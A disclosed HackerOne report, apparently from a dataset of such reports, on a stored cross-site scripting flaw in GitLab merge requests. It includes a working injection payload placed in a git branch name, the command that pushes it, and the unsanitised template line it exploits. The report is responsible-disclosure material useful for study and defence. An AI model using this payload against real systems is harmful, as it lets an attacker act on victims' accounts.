---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '977697'
original_report_id: '977697'
title: Stored-XSS in merge requests
weakness: Cross-site Scripting (XSS) - Stored
team_handle: gitlab
created_at: '2020-09-09T16:50:38.828Z'
disclosed_at: '2021-07-13T08:38:52.399Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 32
asset_identifier: gitlab.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Stored-XSS in merge requests

## Metadata

- HackerOne Report ID: 977697
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: gitlab
- Disclosed At: 2021-07-13T08:38:52.399Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi team,

A stored XSS is existing in the merge requests pages.

### Steps to reproduce

1. In any existing project or create a new project with checking option "Initialize repository with a README"
2. Create a new branch with name `'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`, e.g., `git push origin master:"'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"`
3. Create a new merge request from the new branch to master
4. When open the merge request being created, you should see an alert

### Impact

This stored-XSS allows attacker to execute arbitrary actions on behalf of victim notably via gitlab API. It occurs automatically without any need of victim's interaction despite gitlab CSP.

### Examples

(the alert occurs although existing of CSP of gitlab)

https://gitlab.com/yvvdwf/store-xss-merge-request/-/merge_requests/1

### What is the current *bug* behavior?

In [_sidebar.html.haml](https://gitlab.com/gitlab-org/gitlab/-/blob/3d10455ebe4d90f3a6c4fd73a0d52aa4506e40f8/app/views/shared/issuable/_sidebar.html.haml#L170), the `source_branch` is not sanitized when using as `title` attribute

```ruby
%span
    = _('Source branch: %{source_branch_open}%{source_branch}%{source_branch_close}').html_safe % { source_branch_open: "<cite title='#{source_branch}'>".html_safe, source_branch_close: "</cite>".html_safe, source_branch: source_branch }
```

### What is the expected *correct* behavior?

`sourche_banch` should be sanitized

### Output of checks

This bug happens on GitLab.com

## Impact

This stored-XSS allows attacker to execute arbitrary actions on behalf of victim notably via gitlab API. It occurs automatically without any need of victim's interaction despite gitlab CSP.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
